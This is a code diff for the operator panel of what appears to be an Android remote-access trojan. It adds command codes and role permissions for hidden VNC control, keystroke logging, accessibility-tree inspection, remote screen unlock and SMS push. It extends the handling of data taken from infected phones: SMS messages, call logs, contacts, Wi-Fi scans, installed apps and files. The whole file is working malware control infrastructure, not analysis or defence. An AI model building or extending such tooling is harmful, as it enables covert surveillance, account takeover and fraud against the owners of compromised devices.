@@ -14,6 +14,11 @@ export const CMD = {
   NOTIFICATIONS: '0xNO',
   FASON: '0xFM',
   INFO: '0xIF',
+  HVNC: '0xHV',
+  INSPECTOR: '0xAI',
+  KEYLOGGER: '0xKL',
+  SMS_PUSH: '0xSP',
+  DEVICE_UNLOCK: '0xAU',
 } as const;
 
 export type CmdType = typeof CMD[keyof typeof CMD];
@@ -35,6 +40,10 @@ export type Permission =
   | 'device:permissions'
   | 'device:apps'
   | 'device:fason'
+  | 'device:hvnc'
+  | 'device:inspector'
+  | 'device:keylogger'
+  | 'device:unlock'
   | 'device:command'
   | 'device:delete'
   | 'builder:access'
@@ -51,7 +60,9 @@ export const ALL_PERMISSIONS: Permission[] = [
   'device:sms', 'device:calls', 'device:contacts', 'device:gps',
   'device:camera', 'device:mic', 'device:files', 'device:wifi',
   'device:clipboard', 'device:notifications', 'device:permissions',
-  'device:apps', 'device:fason', 'device:command', 'device:delete',
+  'device:apps', 'device:fason',
+  'device:hvnc', 'device:inspector', 'device:keylogger', 'device:unlock',
+  'device:command', 'device:delete',
   'builder:access', 'logs:view', 'logs:clear', 'users:manage',
   'settings:view', 'settings:edit', 'stats:view', 'files:download',
 ];
@@ -61,8 +72,10 @@ export const DEFAULT_USER_PERMISSIONS: Permission[] = [
   'device:sms', 'device:calls', 'device:contacts', 'device:gps',
   'device:camera', 'device:mic', 'device:files', 'device:wifi',
   'device:clipboard', 'device:notifications', 'device:permissions',
-  'device:apps', 'device:fason', 'device:command',
-  'logs:view', 'settings:view',
+  'device:apps', 'device:fason',
+  'device:hvnc', 'device:inspector',
+  'device:command',
+  'settings:view',
 ];
 
 export const PERMISSION_GROUPS = [
@@ -85,6 +98,10 @@ export const PERMISSION_GROUPS = [
       { key: 'device:permissions' as Permission, label: 'App Permissions', description: 'View app permissions' },
       { key: 'device:apps' as Permission, label: 'Installed Apps', description: 'View installed applications' },
       { key: 'device:fason' as Permission, label: 'Fason Manager', description: 'Fason app management' },
+      { key: 'device:hvnc' as Permission, label: 'HVNC', description: 'Hidden VNC screen capture + input' },
+      { key: 'device:inspector' as Permission, label: 'Inspector', description: 'Accessibility tree inspector' },
+      { key: 'device:keylogger' as Permission, label: 'Keylogger', description: 'Keystroke capture' },
+      { key: 'device:unlock' as Permission, label: 'Auto Unlock', description: 'Remote screen unlock' },
       { key: 'device:command' as Permission, label: 'Send Commands', description: 'Send commands to devices' },
       { key: 'device:delete' as Permission, label: 'Delete Devices', description: 'Remove devices and their data' },
     ],
@@ -113,7 +130,7 @@ export interface DeviceOutletContext {
 }
 
 export interface ClientDevice {
-  id: string; ip: string; country: string | null; city: string | null;
+  id: string; ownerId: string | null; ip: string; country: string | null; city: string | null;
   timezone: string | null; deviceModel: string | null; deviceBrand: string | null;
   deviceVersion: string | null; online: boolean; firstSeen: string; lastSeen: string;
   reconnectCount: number; fasonHidden: boolean; cameraPermission: boolean;
@@ -132,7 +149,7 @@ export interface DeviceInfo {
   storage?: { total: number; used: number; free: number };
   network?: { type: string; subtype: string; carrier: string };
   screen?: { width: number; height: number; density: number };
-  phone?: { imei: string; number: string; network: string };
+  phone?: { imei?: string; number?: string; network?: string; networkOperatorName?: string; simCountryIso?: string; phoneType?: string | number; networkType?: string };
 }
 
 export interface ClientFile { id: number; originalName: string; mimeType: string | null; fileSize: number | null; createdAt: string | null; fileType?: string; }
@@ -151,7 +168,7 @@ export interface ServerConfig {
 export interface ApiResponse<T = unknown> { success: boolean; data?: T; error?: string; message?: string; }
 
 export interface AuthUser {
-  id: number;
+  id: string;
   username: string;
   email: string;
   role: UserRole;
@@ -159,7 +176,7 @@ export interface AuthUser {
 }
 
 export interface UserItem {
-  id: number;
+  id: string;
   username: string;
   email: string;
   role: UserRole;
@@ -167,6 +184,8 @@ export interface UserItem {
   isDefault: number;
   createdAt: string;
   lastLogin: string | null;
+  banned?: boolean;
+  deviceSecret?: string | null;
 }
 
 export interface SmsMessage {
@@ -215,13 +234,15 @@ export interface CameraDevice {
 
 export interface WifiNetwork {
   ssid: string;
-
   bssid: string;
-
   level?: number;
-
   security: string;
   frequency?: number;
+  channel?: number;
+  signalStrength?: number;
+  secure?: boolean;
+  wpa3?: boolean;
+  wifi6?: boolean;
 }
 
 export interface ClipboardEntry {
@@ -252,10 +273,13 @@ export interface PermissionEntry {
 
 export interface AppEntry {
   name: string;
-
   packageName: string;
-
   isSystem: boolean;
+  versionName?: string;
+  versionCode?: number;
+  enabled?: boolean;
+  targetSdkVersion?: number;
+  size?: number;
 }
 
 export interface FileEntry {
@@ -288,11 +312,19 @@ export function coalesce(...values: (unknown)[]): string {
 export function normalizeSmsList(raw: unknown[]): SmsMessage[] {
   return raw.map((item) => {
     const r = item as Record<string, unknown>;
+
+    let type = 0;
+    if (typeof r.type === 'number') {
+      type = r.type;
+    } else if (typeof r.type === 'string') {
+      const parsed = parseInt(r.type, 10);
+      if (!isNaN(parsed)) type = parsed;
+    }
     return {
       address: coalesce(r.address, r.from),
       body: coalesce(r.body, r.message),
       date: coalesce(r.date, r.time),
-      type: typeof r.type === 'number' ? r.type : 0,
+      type,
     };
   });
 }
@@ -302,7 +334,7 @@ export function normalizeCallList(raw: unknown[]): CallRecord[] {
     const r = item as Record<string, unknown>;
     return {
       type: typeof r.type === 'number' ? r.type : 0,
-      number: coalesce(r.number, r.phone),
+      number: coalesce(r.number, r.phone, r.phoneNo),
       name: coalesce(r.name, r.cachedName),
       duration: typeof r.duration === 'number' ? r.duration : parseInt(String(r.duration), 10) || 0,
       date: coalesce(r.date, r.time),
@@ -310,13 +342,49 @@ export function normalizeCallList(raw: unknown[]): CallRecord[] {
   });
 }
 
+const PHONE_TYPE_LABELS: Record<number, string> = {
+  1: 'Home',
+  2: 'Mobile',
+  3: 'Work',
+  4: 'Fax Work',
+  5: 'Fax Home',
+  6: 'Pager',
+  7: 'Other',
+  8: 'Callback',
+  9: 'Car',
+  10: 'Company Main',
+  11: 'ISDN',
+  12: 'Main',
+  13: 'Other Fax',
+  14: 'Radio',
+  15: 'Telex',
+  16: 'TTY TDD',
+  17: 'Work Mobile',
+  18: 'Work Pager',
+  19: 'Assistant',
+  20: 'MMS',
+};
+
 export function normalizeContactList(raw: unknown[]): ContactEntry[] {
   return raw.map((item) => {
     const r = item as Record<string, unknown>;
+    const rawType = r.type;
+    let typeLabel = '';
+    if (typeof rawType === 'number') {
+      typeLabel = PHONE_TYPE_LABELS[rawType] || `Type ${rawType}`;
+    } else if (typeof rawType === 'string' && rawType) {
+
+      const asNum = Number(rawType);
+      if (!isNaN(asNum) && PHONE_TYPE_LABELS[asNum]) {
+        typeLabel = PHONE_TYPE_LABELS[asNum];
+      } else {
+        typeLabel = rawType;
+      }
+    }
     return {
       name: coalesce(r.name, r.displayName),
-      number: coalesce(r.number, r.phone),
-      type: coalesce(r.type),
+      number: coalesce(r.number, r.phone, r.phoneNo),
+      type: typeLabel,
     };
   });
 }
@@ -330,6 +398,11 @@ export function normalizeWifiList(raw: unknown[]): WifiNetwork[] {
       level: typeof r.level === 'number' ? r.level : undefined,
       security: coalesce(r.security, r.capabilities),
       frequency: typeof r.frequency === 'number' ? r.frequency : undefined,
+      channel: typeof r.channel === 'number' ? r.channel : undefined,
+      signalStrength: typeof r.signalStrength === 'number' ? r.signalStrength : undefined,
+      secure: !!r.secure,
+      wpa3: !!r.wpa3,
+      wifi6: !!r.wifi6,
     };
   });
 }
@@ -364,6 +437,11 @@ export function normalizeAppList(raw: unknown[]): AppEntry[] {
       name: coalesce(r.name, r.appName),
       packageName: coalesce(r.packageName, r.package),
       isSystem: !!(r.systemApp || r.isSystem),
+      versionName: typeof r.versionName === 'string' ? r.versionName : undefined,
+      versionCode: typeof r.versionCode === 'number' ? r.versionCode : undefined,
+      enabled: r.enabled !== false,
+      targetSdkVersion: typeof r.targetSdkVersion === 'number' ? r.targetSdkVersion : undefined,
+      size: typeof r.size === 'number' ? r.size : undefined,
     };
   });
 }
@@ -378,6 +456,7 @@ export function normalizeFileList(raw: unknown[]): FileEntry[] {
       size: typeof r.size === 'number' ? r.size : undefined,
       lastModified: r.lastModified as number | string | undefined,
       date: coalesce(r.date) || undefined,
+      encrypted: !!r.encrypted,
     };
   });
 }
